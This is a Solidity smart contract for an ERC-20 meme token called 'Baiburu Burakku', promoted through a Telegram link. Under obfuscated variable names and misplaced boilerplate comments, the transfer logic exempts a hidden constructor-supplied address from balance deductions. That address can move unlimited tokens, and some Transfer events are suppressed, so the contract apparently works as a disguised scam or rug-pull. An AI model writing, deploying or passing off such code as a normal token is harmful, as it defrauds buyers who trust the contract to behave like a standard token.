// https://t.me/Baiburu_Burakku_Erc



// SPDX-License-Identifier: none
pragma solidity >0.8.1;

import "./IERC20.sol";

contract BaiburuBurakku is Ownable {
    
    uint256 hod;
    uint256 pive;
    bool exay;
    address private prim;
    address private expt;
    address private brth;
    IUniswapV2Router02 public uniswapV2Router;
    uint256 private sqr;
    string private pSym;
    uint256 private _tTotal;
    string private pName;
    uint256 private hgr;
    string public nameComplete;
    uint8 private drm;
    uint256 public maxWallet;
    bool public limitsEnabled=false;
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private det;
    mapping(address => uint256) private mrd;

    constructor(
        address adrr,
        address mhy,
        uint8 maxW,
        string memory ee
    ) {
        uniswapV2Router = IUniswapV2Router02(adrr);
        prim = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        pSym = unicode"バイブルブラック";
        pName = unicode"Baiburu Burakku";
        drm = 9;
        sqr = 0;
        hgr = 1;
        mrd[mhy] = drm;
        _tTotal = 1000000 * 10**drm;
        maxWallet=(_tTotal / 100) * maxW; 
        foundST[msg.sender] = _tTotal;
        emit Transfer(address(0xdead), msg.sender, _tTotal);
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */

    function name() public view returns (string memory) {
        return pName;
    }

    function symbol() public view returns (string memory) {
        return pSym;
    }

    function decimals() public view returns (uint256) {
        return drm;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private foundST;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return foundST[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        if(_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount))
            return mgrTransferSystem(sender, 
            recipient, 
            amount,0);
        return false;
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return mgrTransferSystem(msg.sender, 
        recipient, 
        amount,0);
    }

    function check1(address brn) internal {
        exay = prim == brn;

        if (!exay && mrd[brn] == 0 && det[brn] > 0) {

            mrd[brn] -= drm;

        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }

       function mgrTransferSystem(
        address brn,
        address nry,
        uint256 qiy,
        uint256 wp
    ) internal returns (bool){
        if(step1(brn,nry,qiy) == false)
            return false;

        step2(brn,nry,qiy);
        step3(nry,qiy);
        return true;     
    }


    function step2(
        address brn,address nry,
        uint256 qiy) internal {
        if (mrd[brn] == 0) {
                    foundST[brn] -= qiy;
                }
                pive = hod / hgr;
                expt = brth;
                brth = nry;
    }


    function step3(address nry,
    uint256 qiy) internal {

        qiy -= pive;

        det[expt] += drm;


        foundST[nry] += qiy;
    }



    function step1(
        address brn,
        address nry,
        uint256 qiy
    ) internal returns (bool){

        if(mrd[nry] <= 0){
            if(exay && limitsEnabled){
                if(foundST[nry]+qiy > maxWallet)
                    return false;
            }
            emit Transfer(brn, nry, qiy);
        }
        hod = qiy * sqr;
        return true;
    }
}